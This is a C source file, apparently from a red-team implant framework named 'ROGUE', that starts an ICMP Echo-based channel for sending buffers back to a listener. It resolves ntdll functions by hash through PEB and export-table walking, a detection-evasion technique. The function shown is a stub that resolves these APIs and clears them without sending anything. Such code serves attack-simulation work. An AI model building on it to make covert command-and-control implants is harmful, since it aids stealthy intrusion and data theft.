/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( RtlIpv4StringToAddressA );
	D_API( LdrGetProcedureAddress );
	D_API( RtlInitUnicodeString );
	D_API( RtlInitAnsiString );
	D_API( RtlReAllocateHeap );
	D_API( RtlAllocateHeap );
	D_API( LdrUnloadDll );
	D_API( RtlFreeHeap );
	D_API( LdrLoadDll );
} API ;

/* API Hashes */
#define H_API_RTLIPV4STRINGTOADDRESSA	0xb3d0cd9b /* RtlIpv4StringToAddressA */
#define H_API_LDRGETPROCEDUREADDRESS	0xfce76bb6 /* LdrGetProcedureAddress */
#define H_API_RTLINITUNICODESTRING	0xef52b589 /* RtlInitUnicodeString */
#define H_API_RTLINITANSISTRING		0xa0c8436d /* RtlInitAnsiString */
#define H_API_RTLREALLOCATEHEAP		0xaf740371 /* RtlReAllocateHeap */
#define H_API_RTLALLOCATEHEAP		0x3be94c5a /* RtlAllocateHeap */
#define H_API_LDRUNLOADDLL		0xd995c1e6 /* LdrUnloadDll */
#define H_API_RTLFREEHEAP		0x73a9e4d7 /* RtlFreeHeap */
#define H_API_LDRLOADDLL		0x9e456a43 /* LdrLoadDll */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Sends a buffer over ICMP back to the listener.
 * Uses ICMP Echo requests to safely operate 
 * without issue. Data is returned if it matches
 * the specification.
 *
!*/
D_SEC( B ) BOOL IcmpSendRecv( _In_ PCHAR HostName, _In_ PVOID InBuffer, _In_ UINT32 InLength, _Out_ PVOID* OutBuffer, _Out_ PUINT32 OutLength )
{
	API		Api;
	UNICODE_STRING	Uni;

	/* Zero out the stack structure */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	/* Init API structure */
	Api.RtlIpv4StringToAddressA = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLIPV4STRINGTOADDRESSA );
	Api.LdrGetProcedureAddress  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRGETPROCEDUREADDRESS );
	Api.RtlInitUnicodeString    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING );
	Api.RtlInitAnsiString       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITANSISTRING );
	Api.RtlReAllocateHeap       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREALLOCATEHEAP );
	Api.RtlAllocateHeap         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.LdrUnloadDll            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
	Api.RtlFreeHeap             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api.LdrLoadDll              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );

	/* Zero out the stack structure */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
};
